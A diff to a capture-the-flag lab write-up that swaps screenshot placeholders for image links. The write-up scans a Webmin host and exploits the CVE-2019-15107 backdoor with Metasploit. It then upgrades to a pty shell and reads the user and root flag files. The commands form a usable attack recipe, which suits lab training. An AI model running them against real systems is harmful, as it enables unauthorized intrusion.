@@ -14,7 +14,7 @@
 nmap <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="722" height="270" alt="SCREEN01" src="https://github.com/user-attachments/assets/98aaff5f-3886-4e1a-97e7-c84c38648eac" />
 
 2. Examine the Webmin service to identify the specific version running
 
@@ -22,7 +22,7 @@ nmap <TARGET_IP>
 curl -k -I https://<TARGET_IP>:10000/
 ```
 
-[SCREEN02]
+<img width="721" height="219" alt="SCREEN02" src="https://github.com/user-attachments/assets/0154ac42-7891-47c6-9bcd-46e70cdbedd3" />
 
 3. Based on the enumeration results, research known vulnerabilities for the identified Webmin version. The CVE-2019-15107 backdoor vulnerability affects Webmin versions 1.882 through 1.921. Launch Metasploit and configure the exploit module. Once the exploit succeeds, navigate to the user directory and capture the first flag
 
@@ -36,13 +36,17 @@ set RHOSTS <TARGET_IP>
 set RPORT 10000
 set SSL true
 exploit
+```
 
+<img width="722" height="434" alt="SCREEN03" src="https://github.com/user-attachments/assets/b86a3eca-2916-4dba-a2d8-a78c8f722289" />
+
+```
 whoami
 python -c 'import pty; pty.spawn("/bin/bash")'
 cat /home/dark/user.txt
 ```
 
-[SCREEN04]
+<img width="718" height="232" alt="SCREEN04" src="https://github.com/user-attachments/assets/a9fd046e-ea4a-4e9f-b638-2f6f574688d5" />
 
 ---
 
@@ -54,4 +58,4 @@ cat /home/dark/user.txt
 cat /root/root.txt
 ```
 
-[SCREEN05]
+<img width="717" height="144" alt="SCREEN05" src="https://github.com/user-attachments/assets/209bb763-b613-47a4-a035-30b4ffeb9bb6" />
